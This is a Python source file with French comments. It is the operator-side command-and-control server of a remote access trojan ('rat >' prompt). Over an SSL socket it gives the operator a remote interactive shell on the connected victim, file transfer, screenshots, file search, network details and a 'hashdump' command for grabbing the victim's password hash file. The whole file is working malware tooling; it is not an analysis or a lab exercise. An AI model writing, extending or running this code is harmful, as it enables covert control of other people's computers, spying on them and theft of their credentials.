from fileinput import filename
import socket
import ssl
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

# Fonction permettant de récupérer la liste des commandes disponibles
def menu_help(client_socket):
    client_socket.send(b'help')  # Envoie de la commande
    menu_help_received = client_socket.recv(4096).decode()  # Réception du menu d'aides
    print(f'{menu_help_received}')# Affichage du menu d'aides

# Fonction permettant de télécharger un fichier du client
def download(client_socket):
    client_socket.send(b'download')  # Envoie de la commande

# Fonction permettant de charger un fichier du serveur vers le client
def upload(ssl_socket):
    while True:
        filename = input("[?] Entrez le nom du fichier à envoyer : ") # Récupération saisie du nom du fichier
        if filename.strip() == "": # Check si le fichier est vide
            print("[!] Le nom du fichier ne peut pas être vide !")
        else:
            break
        
    results = []
    disk_root = "C:\\"
    
    for root, dirs, files in os.walk(disk_root):
        if filename in files:
            results.append(os.path.join(root, filename))
            
    if results:
        print("[*] Voici les fichiers trouvés :")
        for result, filepath in enumerate(results):
            print(f"    => {result + 1} - {filepath}")        
        while True:
            try:
                choice = int(input("Entrez le numéro de fichier à envoyer :"))
                if 0 < choice <= len(results):
                    filepath = results[choice-1]
                    break
                else:
                    
                    print("Numéro invalide. Veuillez saisir un numéro dans la liste :")
            except ValueError:
                print(f"Entrée invalide. Veuillez saisir un numéro valide.")
                    
        try:
            ssl_socket.send(b'upload')
            ssl_socket.send(filename.encode())
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk : 
                        break
                    ssl_socket.sendall(chunk)       
        except Exception as e:
            print(f"Erreur lors de l'envoi du fichier {filename} : {str(e)}")
    else:
        print(f"Aucun fichier du nom de '{filename}' n'a été trouvé")        

# Fonction permettant d'initier un shell intéractif sur le client
def shell(client_socket, client_ip):
    client_socket.send(b'shell')  # Envoie de la commande
    repertoire_actuel = client_socket.recv(4096).decode()
    print(f'\n{repertoire_actuel}')
    print("\n[*] Taper 'quit' pour quitter le Shell\n")
    while True:
        commande_shell = input(f"[{client_ip}] Shell > ")  # Récupération de la commande Shell saisie
        if commande_shell.lower() == 'quit':  # Gestion de la sortie du Shell
            client_socket.send(b'quit')
            break
        elif commande_shell.lower() == 'help':
            client_socket.send(b'help')
        else:
            client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
        commande_shell_received = client_socket.recv(4096).decode()  # Récupération de la réponse de la commande Shell
        print(f'\n{commande_shell_received}')  # Affichage de la réponse de la commande Shell

# Fonction permettant de récupérer la configuration réseau du client
def ipconfig(client_socket):
    client_socket.send(b'ipconfig')  # Envoie de la commande
    conf_received = client_socket.recv(4096).decode()  # Récupération des données de la configuration
    print(f'\n{conf_received}')  # Affichage de la configuration

# Fonction permettant de récupérer la capture d'écran du client
def screenshot(client_socket, nb_screenshot):
    client_socket.send(b'screenshot')  # Envoie de la commande
    screenshot_name = f'screenshot{nb_screenshot}.png'
    with open(screenshot_name, 'wb') as screenshot:  # Ouverture du fichier créé
        while True:
            screenshot_received = client_socket.recv(4096)  # Récupération des données de la capture d'écran
            if screenshot_received.endswith(b'END'):  # Vérification du délimiteur final
                screenshot.write(screenshot_received[:-3])  # Ecriture des données reçues dans le fichier ouvert sans le délimiteur
                break
            screenshot.write(screenshot_received)  # Ecriture des données reçues dans le fichier ouvert
    print(f'[+] {screenshot_name} reçu')
    return nb_screenshot + 1  # Incrémentation du nombre de capture d'écran

# Fonction permettant de chercher un fichier sur la machine du client
def search(client_socket) :
    while True:
        recherche_to_send = input("[?] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
        if recherche_to_send.strip() == "":
            print("[!] Le nom du fichier ne peut pas être vide.")
        else:
            break
    client_socket.send(b'search') # Envoie de la commande
    client_socket.send(recherche_to_send.encode()) # Envoie du nom du fichier à rechercher
    recherche_received = client_socket.recv(4096).decode() # Récupération des résultats de la recherche
    print(f'\n{recherche_received}\n') # Affichage des résultats de la recherche

# Fonction permettant de récupérer le fichier shadow du client
def hashdump(client_socket):
    client_socket.send(b'hashdump')  # Envoie de la commande

def main():
    # Récupération et définition des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')
    nb_screenshot = 1
    cert = './cert.pem'
    key = './key.pem'

    # Création du contexte SSL pour l'authentification client
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert, keyfile=key)

    # Création du socket TCP pour la connexion au serveur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_server, SERVER_PORT))  # Définition de l'adresse et du port d'écoute du serveur
    server_socket.listen(1)  # Mise en écoute du socket

    print(f"[*] Listening on {SERVER_PORT}...")

    # Enveloppement du socket avec SSL pour sécuriser la communication
    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
        # Attente d'une connexion entrante et acceptation de celle-ci
        client_socket, client_address = ssl_socket.accept()
        client_ip, client_port = client_socket.getpeername()  # Récupération de l'adresse IP du client
        print("[+] Agent received!")

        # Gestion des commandes envoyées au client
        while True:
            command = input("rat > ")
            if command.lower() == 'help':
                menu_help(client_socket)
            elif command.lower() == 'download':
                download(client_socket)
            elif command.lower() == 'upload':
                upload(client_socket)
            elif command.lower() == 'shell':
                shell(client_socket, client_ip)
            elif command.lower() == 'ipconfig':
                ipconfig(client_socket)
            elif command.lower() == 'screenshot':
                nb_screenshot = screenshot(client_socket, nb_screenshot)
            elif command.lower() == 'search':
                search(client_socket)
            elif command.lower() == 'hashdump':
                hashdump(client_socket)
            elif command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            else:
                print("[!] Commande non reconnue")  # Gestion des saisies utilisateur
                print("[*] Taper 'help' pour voir la liste des commandes disponibles")

        client_socket.close()  # Fermeture du socket client
    server_socket.close()  # Fermeture du socket serveur

if __name__ == "__main__":
    main()
